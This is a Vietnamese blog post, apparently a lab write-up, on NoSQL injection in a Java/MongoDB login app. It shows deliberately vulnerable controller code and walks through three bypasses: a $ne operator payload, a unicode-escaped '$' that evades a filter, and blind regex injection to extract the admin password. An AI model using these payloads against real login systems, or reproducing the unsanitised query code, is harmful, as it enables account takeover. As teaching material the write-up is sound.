@@ -1,0 +1,274 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NoSQL Injection Vulnerability Challenge Java | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NoSQL Injection Vulnerability Challenge JavaTổng quan về NoSQL Injection Tấn công NoSQL injection là một lỗ hổng bảo mật trong các ứng dụng web sử dụng cơ sở dữ liệu NoSQL. NoSQL (viết tắt của “Not On">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NoSQL Injection Vulnerability Challenge Java">
+<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-10-06-NoSQL-Injection-Lab/index.html">
+<meta property="og:site_name" content="Phat Mai Blog">
+<meta property="og:description" content="NoSQL Injection Vulnerability Challenge JavaTổng quan về NoSQL Injection Tấn công NoSQL injection là một lỗ hổng bảo mật trong các ứng dụng web sử dụng cơ sở dữ liệu NoSQL. NoSQL (viết tắt của “Not On">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pzhat.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-11-14T19:34:38.226Z">
+<meta property="article:modified_time" content="2025-10-24T05:38:35.000Z">
+<meta property="article:author" content="Phat Mai">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pzhat.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NoSQL Injection Vulnerability Challenge Java",
+  "url": "https://pzhat.github.io/2025/11/15/2025-10-06-NoSQL-Injection-Lab/",
+  "image": "https://pzhat.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-11-14T19:34:38.226Z",
+  "dateModified": "2025-10-24T05:38:35.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Phat Mai",
+      "url": "https://pzhat.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-10-06-NoSQL-Injection-Lab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NoSQL Injection Vulnerability Challenge Java',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">NoSQL Injection Vulnerability Challenge Java</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">NoSQL Injection Vulnerability Challenge Java</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.226Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-24T05:38:35.000Z" title="Updated 2025-10-24 12:38:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="NoSQL-Injection-Vulnerability-Challenge-Java"><a href="#NoSQL-Injection-Vulnerability-Challenge-Java" class="headerlink" title="NoSQL Injection Vulnerability Challenge Java"></a>NoSQL Injection Vulnerability Challenge Java</h1><h3 id="Tong-quan-ve-NoSQL-Injection"><a href="#Tong-quan-ve-NoSQL-Injection" class="headerlink" title="Tổng quan về NoSQL Injection"></a>Tổng quan về NoSQL Injection</h3><ul>
+<li><p>Tấn công NoSQL injection là một lỗ hổng bảo mật trong các ứng dụng web sử dụng cơ sở dữ liệu NoSQL. NoSQL (viết tắt của “Not Only SQL”) là các hệ thống cơ sở dữ liệu không sử dụng ngôn ngữ truy vấn có cấu trúc SQL, mà thay vào đó dùng các định dạng dữ liệu linh hoạt hơn như cặp khóa-giá trị, tài liệu (document), hoặc đồ thị dữ liệu.</p>
+</li>
+<li><p>Tương tự như SQL injection, NoSQL injection cho phép kẻ tấn công vượt qua xác thực, đánh cắp dữ liệu nhạy cảm, thay đổi dữ liệu trong cơ sở dữ liệu, hoặc thậm chí chiếm quyền kiểm soát cơ sở dữ liệu và máy chủ bên dưới. Phần lớn các lỗ hổng NoSQL injection xuất hiện do lập trình viên xử lý dữ liệu đầu vào từ người dùng mà không thực hiện kiểm tra hoặc làm sạch dữ liệu đúng cách.</p>
+</li>
+<li><p>Do NoSQL không có một ngôn ngữ truy vấn chuẩn hóa duy nhất, các loại truy vấn được phép sẽ phụ thuộc vào:</p>
+</li>
+<li><p>Công cụ cơ sở dữ liệu — ví dụ: MongoDB, Cassandra, Redis, hoặc Google Bigtable</p>
+</li>
+<li><p>Ngôn ngữ lập trình — ví dụ: Python, PHP</p>
+</li>
+<li><p>Framework phát triển — ví dụ: Angular, Node.js</p>
+</li>
+<li><p>Một điểm chung của hầu hết các cơ sở dữ liệu NoSQL là chúng hỗ trợ định dạng JSON (JavaScript Object Notation) dạng văn bản, và thường cho phép người dùng gửi dữ liệu đầu vào dưới dạng tệp JSON. Nếu dữ liệu này không được kiểm tra và làm sạch, nó có thể trở thành mục tiêu của các cuộc tấn công injection.</p>
+</li>
+</ul>
+<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p><a target="_blank" rel="noopener" href="https://github.com/pzhat/NoSQL_Injection_Lab">Github</a></p>
+<h3 id="Tong-quan-challenge"><a href="#Tong-quan-challenge" class="headerlink" title="Tổng quan challenge"></a>Tổng quan challenge</h3><p><img src="https://hackmd.io/_uploads/ByVL62gplx.png" alt="image"></p>
+<p>Lab sẽ bao gồm 3 challenge tương ứng với 3 độ khó khác nhau:</p>
+<ul>
+<li>Challenge 1 : No Filter</li>
+<li>Challenge 2: Filter biến ‘$’</li>
+<li>Challenge 3: Làm thông báo không trả về (Blind NoSQL).</li>
+</ul>
+<p>Ở đây mình làm một chall đơn giản với chức năng chính là đăng nhập.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">adminPassword</span> <span class="operator">=</span> <span class="string">&quot;SuperSecretPassword_&quot;</span> + UUID.randomUUID();</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây Admin password sẽ được tự động gen ra random.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userRepository.save(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, adminPassword));</span><br><span class="line">userRepository.save(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;password123&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/BJIeepgale.png" alt="image"></p>
+<p>Ở đây mình khởi tạo 2 user chính là <code>user</code> và <code>admin</code>.</p>
+<p>Phần xử lý logic chính của challenge sẽ nằm trong <code>AuthController.java</code> nó sẽ xử lý đầy đủ logic của 3 challenges.</p>
+<h3 id="Khai-thac-va-POC"><a href="#Khai-thac-va-POC" class="headerlink" title="Khai thác và POC"></a>Khai thác và POC</h3><h4 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1:"></a>Challenge 1:</h4><p>Đến với chall đầu tiên này thì nó đơn giản là không có lớp filter nào ở đoạn NoSQl truy vẫn đến database.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AuthController</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/api/challenge1/login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">challenge1</span><span class="params">(<span class="meta">@RequestBody</span> JsonNode payload)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> payload.get(<span class="string">&quot;username&quot;</span>).asText();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">password</span> <span class="operator">=</span> objectMapper.convertValue(payload.get(<span class="string">&quot;password&quot;</span>), Object.class);</span><br><span class="line">            <span class="keyword">return</span> performLogin(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(<span class="number">400</span>).body(<span class="string">&quot;JSON payload không hợp lệ.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UserRespository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">MongoRepository</span>&lt;User, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;&#123;&#x27;username&#x27;: ?0, &#x27;password&#x27;: ?1&#125;&quot;)</span></span><br><span class="line">    Optional&lt;User&gt; <span class="title function_">findUserByLogin</span><span class="params">(String username, Object password)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Đây là kịch bản cơ bản nhất. Backend nhận username (dạng chuỗi) và password (dạng Object). Việc chấp nhận một Object cho trường mật khẩu là lỗ hổng chí mạng, vì nó cho phép chúng ta thay thế một giá trị chuỗi đơn giản bằng một đối tượng toán tử truy vấn của MongoDB.</p>
+<p><img src="https://hackmd.io/_uploads/r1vVZTlpxe.png" alt="image"></p>
+<p>Ở đây tôi thử đăng nhập bằng mật khẩu lung tung thì được trả về 401 bây giờ ta sẽ thử với mật khẩu được generate ra xem có đăng nhập được không.</p>
+<p><img src="https://hackmd.io/_uploads/rJBOWTealx.png" alt="image"></p>
+<p>Với password được gen ra thì hoàn toàn có thể truy cập với user admin. Vậy trong trường hợp ta không biết mật khẩu thì ta có thể khai thác NoSQL này như thế nào.</p>
+<p>Ở đây với challenge 1 là không có filter vậy ta sẽ sử dụng payload đơn giản là lợi dụng operator logic để khai thác ở đây mình sử dụng <code>$ne</code> có nghĩa là <code>not equals</code>.</p>
+<p><img src="https://hackmd.io/_uploads/ryYhragaee.png" alt="image"></p>
+<p>Giải thích Payload</p>
+<ul>
+<li>Bình thường, câu truy vấn sẽ là: <code>db.users.find({username: &quot;admin&quot;, password: &quot;your_input&quot;})</code></li>
+<li>Khi bạn gửi payload trên, câu truy vấn thực tế trên server sẽ trở thành: <code>db.users.find({username: &quot;admin&quot;, password: { $ne: null }})</code></li>
+<li>Câu lệnh này có nghĩa là: “Hãy tìm một người dùng có username là admin và có trường password không phải là null (tức là có tồn tại mật khẩu)”.</li>
+<li>Vì tài khoản admin của chúng ta chắc chắn có mật khẩu, điều kiện này sẽ đúng và đăng nhập thành công.</li>
+</ul>
+<p>Vậy là ta đã thành công lợi dụng logic để có thể đăng nhập vào tài khoản admin mà không cần password.</p>
+<h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2:"></a>Challenge 2:</h4><p><img src="https://hackmd.io/_uploads/rJUuvCeael.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/api/challenge2/login&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">challenge2</span><span class="params">(HttpServletRequest request)</span> &#123; <span class="comment">// Nhận vào HttpServletRequest</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rawPayload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rawPayload.contains(<span class="string">&quot;$&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(<span class="number">400</span>).body(<span class="string">&quot;Payload chứa ký tự không hợp lệ ($)!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">JsonNode</span> <span class="variable">node</span> <span class="operator">=</span> objectMapper.readTree(rawPayload);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> node.get(<span class="string">&quot;username&quot;</span>).asText();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">password</span> <span class="operator">=</span> objectMapper.convertValue(node.get(<span class="string">&quot;password&quot;</span>), Object.class);</span><br><span class="line">        <span class="keyword">return</span> performLogin(username, password);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(<span class="number">500</span>).body(<span class="string">&quot;Lỗi hệ thống khi đọc request.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(<span class="number">400</span>).body(<span class="string">&quot;JSON không hợp lệ.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Đến với level 2 ta để ý rằng có dòng:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rawPayload.contains(<span class="string">&quot;$&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(<span class="number">400</span>).body(<span class="string">&quot;Payload chứa ký tự không hợp lệ ($)!&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Đoạn code này đã chặn đi dấu <code>$</code> mà ta sử dụng hầu như trong tất cả cách payload.</p>
+<p><img src="https://hackmd.io/_uploads/ByRDORgTgg.png" alt="image"></p>
+<p>Nhưng nếu như ta để ý kĩ phần xử lý http request của challenge 2 thì ta có thể thấy rằng dev đã vô tình chỉ xử lý dữ liệu theo kiểu thô <code>String rawPayload = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);</code> và không hề có bước check rằng nếu user nhập dưới dạng encode các loại thì có bị block hay không nên đây có thể là đường khai thác cho ta ở challenge này.</p>
+<p>Ở đây vì nó nhận raw request nên ta hoàn toàn có thể sử dụng cách đó là lợi dụng <code>Unicode Escape</code> để biến giá trị <code>$</code> thành <code>\u0024</code>.</p>
+<p>Bây giờ với cách như vậy ta sẽ thử payload xem sao.</p>
+<p><img src="https://hackmd.io/_uploads/SJKIK0e6lx.png" alt="image"></p>
+<p>Vậy là ta đã thành công bypass lớp filter ở level 2 bằng unicode escape.</p>
+<h4 id="Challenge-3-Blind-NoSQLi"><a href="#Challenge-3-Blind-NoSQLi" class="headerlink" title="Challenge 3 (Blind NoSQLi):"></a>Challenge 3 (Blind NoSQLi):</h4><p>Đến với challenge thứ 3 này ta có đoạn xử lý logic như sau:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/api/challenge3/login&quot;)</span></span><br><span class="line"> <span class="meta">@ResponseBody</span></span><br><span class="line"> <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">challenge3</span><span class="params">(<span class="meta">@RequestBody</span> JsonNode payload)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> payload.get(<span class="string">&quot;username&quot;</span>).asText();</span><br><span class="line">         <span class="type">String</span> <span class="variable">passwordRegex</span> <span class="operator">=</span> payload.get(<span class="string">&quot;password&quot;</span>).asText();</span><br><span class="line">         <span class="type">String</span> <span class="variable">anchoredRegex</span> <span class="operator">=</span> <span class="string">&quot;^&quot;</span> + passwordRegex + <span class="string">&quot;$&quot;</span>;</span><br><span class="line"></span><br><span class="line">         <span class="type">Query</span> <span class="variable">query</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">         query.addCriteria(Criteria.where(<span class="string">&quot;username&quot;</span>).is(username)</span><br><span class="line">                 .and(<span class="string">&quot;password&quot;</span>).regex(anchoredRegex)); <span class="comment">// Dùng regex đã được neo</span></span><br><span class="line"></span><br><span class="line">         List&lt;User&gt; users = mongoTemplate.find(query, User.class);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (!users.isEmpty()) &#123;</span><br><span class="line">             <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;Đăng nhập thành công.&quot;</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> ResponseEntity.status(<span class="number">401</span>).body(<span class="string">&quot;Đăng nhập thất bại.&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         <span class="keyword">return</span> ResponseEntity.status(<span class="number">400</span>).body(<span class="string">&quot;Payload không hợp lệ (password phải là string).&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> ResponseEntity&lt;String&gt; <span class="title function_">performLogin</span><span class="params">(String username, Object password)</span> &#123;</span><br><span class="line">     Optional&lt;User&gt; user = userRepository.findUserByLogin(username, password);</span><br><span class="line">     <span class="keyword">if</span> (user.isPresent()) &#123;</span><br><span class="line">         <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;Đăng nhập thành công với tài khoản: &quot;</span> + user.get().getUsername());</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ResponseEntity.status(<span class="number">401</span>).body(<span class="string">&quot;Sai tên đăng nhập hoặc mật khẩu.&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây có các lớp phòng thủ là:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> payload.get(<span class="string">&quot;username&quot;</span>).asText();</span><br><span class="line"><span class="type">String</span> <span class="variable">passwordRegex</span> <span class="operator">=</span> payload.get(<span class="string">&quot;password&quot;</span>).asText();</span><br></pre></td></tr></table></figure>
+
+<p>Nó sẽ ép kiểu password thành dạng string và các payload kiểu object sẽ bị block đi nên là các payload cũ sẽ không còn khả thi cho challenge này.</p>
+<p>Tiếp theo là:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">anchoredRegex</span> <span class="operator">=</span> <span class="string">&quot;^&quot;</span> + passwordRegex + <span class="string">&quot;$&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Chúng ta lấy chuỗi regex mà người dùng gửi (passwordRegex) và tự động ghép thêm hai ký tự đặc biệt vào:</li>
+<li>^: Ký tự neo (anchor), có nghĩa là “khớp từ đầu chuỗi”.</li>
+<li>$: Ký tự neo (anchor), có nghĩa là “khớp đến cuối chuỗi”.<br>Tác dụng:</li>
+<li>Nếu người dùng gửi payload đơn giản là S, chuỗi regex cuối cùng sẽ là ^S$. Câu lệnh này có nghĩa là: “Tìm một mật khẩu bắt đầu bằng ‘S’ và kết thúc ngay sau đó” (tức là mật khẩu chỉ có đúng một ký tự là ‘S’). Điều này sẽ thất bại.</li>
+<li>Nó ngăn chặn hoàn toàn các kiểu tấn công “chứa” (contains) mà chúng ta đã gặp ở phiên bản lỗi trước.</li>
+<li>Nó bắt buộc attacker phải xây dựng một regex phức tạp hơn, có thể khớp với toàn bộ mật khẩu, nếu muốn nhận được phản hồi “thành công”.</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Query</span> <span class="variable">query</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">query.addCriteria(Criteria.where(<span class="string">&quot;username&quot;</span>).is(username)</span><br><span class="line">                          .and(<span class="string">&quot;password&quot;</span>).regex(anchoredRegex));</span><br><span class="line">List&lt;User&gt; users = mongoTemplate.find(query, User.class);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>MongoTemplate là một công cụ của Spring giúp xây dựng các câu truy vấn MongoDB một cách linh hoạt.</li>
+<li>Lệnh Criteria.where(“password”).regex(anchoredRegex) chính là nơi lỗ hổng tồn tại. Nó nói với MongoDB: “Hãy tìm trong trường password, những document nào khớp với biểu thức chính quy chứa trong biến anchoredRegex”.</li>
+</ul>
+<p>Với các phân tích về code của challenge 3 trên thì ta có kịch bản tấn công là lợi dụng regex để khai thác NoSQL. Vì ở đây developer tuy đã sử dụng regex để phòng thủ nhưng lại không chú ý đến việc escape các regex mà người dùng có thể nhập vào bên trong dẫn đến attacker có thể lợi dụng chính các regex đó để tạo ra payload. Kỹ thuật này gọi là Regex Injection.</p>
+<p><img src="https://hackmd.io/_uploads/B1LQ0kZaex.png" alt="image"></p>
+<p>Thử với payload ở level trước nhưng nhận được 401 bây giờ ta sẽ tiến hành thử với regex injection.</p>
+<p>Trước hết ta sẽ thử xài regex để dò độ dài của password.</p>
+<p><img src="https://hackmd.io/_uploads/By61glbTel.png" alt="image"></p>
+<p>Với độ dài là 30 thì ta nhận kết quả trả về ở đây ta cho nó là false tại đây ta có thể sử dụng burp intruder để xác định được độ dài của chuỗi password.</p>
+<p><img src="https://hackmd.io/_uploads/ry7Oeeb6gx.png" alt="image"></p>
+<p>Ta sẽ test thử từ 1 đến 100 xem sao.</p>
+<p><img src="https://hackmd.io/_uploads/ByqjggWpee.png" alt="image"></p>
+<p>Với số 56 ta nhận về được response 200 duy nhất nên có thể xác định password có 56 kí tự.</p>
+<p>Từ đây ta sẽ tiến hành tìm từng kí tự của password với giới hạn là 56 kí tự.</p>
+<p><img src="https://hackmd.io/_uploads/ByMf-xb6xe.png" alt="image"></p>
+<p>Với regex <code>A.{55}</code> này thì nó có nghĩa là kí tự đầu sẽ là A và 55 kí tự còn lại là bất cứ thứ gì nhưng có vẻ với kí tự đầu tiên là A đã sai vì server trả về response là 401.</p>
+<p><img src="https://hackmd.io/_uploads/r1eDWeWTgx.png" alt="image"></p>
+<p>Tiến hành thử với chữ S thì ta đã thành công trong việc dump ra được kí tự đầu tiên của password vì server đã trả về response là 200 cho payload <code>S.{55}</code>.</p>
+<p>Nếu test tay với password có độ dài khủng như này thì sẽ rất là mất thời gian dò nên ta hoàn toàn có thể lợi dụng python script để có thể dump password một cách nhanh chóng.</p>
